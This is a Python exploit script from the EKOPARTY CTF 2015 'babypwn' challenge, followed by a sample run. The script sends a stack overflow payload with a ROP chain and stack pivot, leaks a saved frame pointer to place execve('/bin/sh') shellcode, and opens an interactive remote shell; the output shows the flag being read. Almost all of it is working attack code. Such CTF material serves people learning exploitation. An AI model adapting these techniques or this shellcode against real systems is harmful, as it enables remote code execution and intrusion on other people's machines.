#!/usr/bin/python
#
# EKOPARTY CTF 2015 - FINAL
# pwn50 - babypwn
# @danigargu
# 

import socket
import time
import sys

from struct import pack,unpack

host = 'ctfchallenges.ctf.site'
host = 'kali'
port =  50004

p = lambda x : pack("<L", x)   # pack

def decode_buffer(data):
  return ''.join([chr(ord(data[i]) ^ 0x158 & 0xFF) for i in range(len(data))])  

def get_connection(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip,port))
  return s

def interact_shell(s):
  while True:
    try:
      sys.stdout.write("$ ")
      sys.stdout.flush()
      c = sys.stdin.readline()
      s.send(c)
      time.sleep(0.5)
      sys.stdout.write(s.recv(4096))
    except KeyboardInterrupt, e:
      print " quit"
      s.close()
      break

magic     = "\x02\x01\x05\x0a"
leave_ret = 0x080484a0  # leave ; ret
pop_ebp   = 0x08048873  # pop ebp ; ret
pop3ret   = 0x080488d6  # pop esi ; pop edi ; pop ebp ; ret
read_plt  = 0x080484c0  # read@plt
data      = 0x08049B60  #

# execve("/bin/sh", ["/bin/sh"], NULL)
shellcode = (
  "\x90\x90\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68"
  "\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" 
)

# STAGE1 - read custom stack frame
stage1 =  p(read_plt)
stage1 += p(pop3ret)
stage1 += p(0)
stage1 += p(data)
stage1 += p(24)

# STACK PIVOT
stage1 += p(pop_ebp)
stage1 += p(data)
stage1 += p(leave_ret)

payload  = magic
payload += "A" * 6
payload += '\x10'
payload += 'A' * 17
payload += pack("<L", 6000)
payload += "A"*16
payload += stage1 # return address

print "[*] Payload (size: %d):" % len(payload)
print payload.encode("hex") + "\n"

s = get_connection(host, port)
s.recv(1024)
s.send("1023\n")
time.sleep(1)

s.send(payload)
time.sleep(3)
resp = s.recv(6001)

decoded = decode_buffer(resp)
assert(len(decoded) != 0)

saved_ebp = decoded[97:97+4]
saved_ebp = unpack("<L", saved_ebp)[0]

print "[*] Saved EBP: 0x%08x" % saved_ebp

saved_ebp -= 64

print "[*] shellcode address: 0x%08x" % saved_ebp

# STAGE2 - read & execute shellcode
stage2  = "AAAA"
stage2 += p(read_plt)         # read@plt
stage2 += p(saved_ebp+2)      # ret
stage2 += p(0)                # stdin
stage2 += p(saved_ebp)        # saved ebp
stage2 += p(len(shellcode))   # shellcode length

# Transfer stage2 to custom stack
s.send(stage2)
time.sleep(0.5)
print "[*] sending shellcode...",
s.send(shellcode)
time.sleep(3)
print "DONE"

s.send("echo l33t\n")
if 'l33t' in s.recv(0x40):
  print "[+] got shell! :)\n"
  interact_shell(s)
else:
  print "[-] exploit failed"

"""
$ python xpl.py 
[*] Payload (size: 80):
0201050a4141414141411041414141414141414141414141414141417017000041414141414141414141414141414141c0840408d688040800000000609b04081800000073880408609b0408a0840408

[*] Saved EBP: 0xbfec9768
[*] Return address: 0xbfec9669
[*] sending shellcode... DONE
[+] got shell! :)

$ id
uid=1000(baby) gid=1000(baby) groups=1000(baby)
$ ls -l
total 12
-r-xr-x--- 1 root baby 6558 Oct 20 13:43 baby
-r--r----- 1 root baby   31 Oct 20 13:47 flag.txt
$ cat flag.txt
EKO{welc0me_baby_pwning_CH4LL}
$ 
"""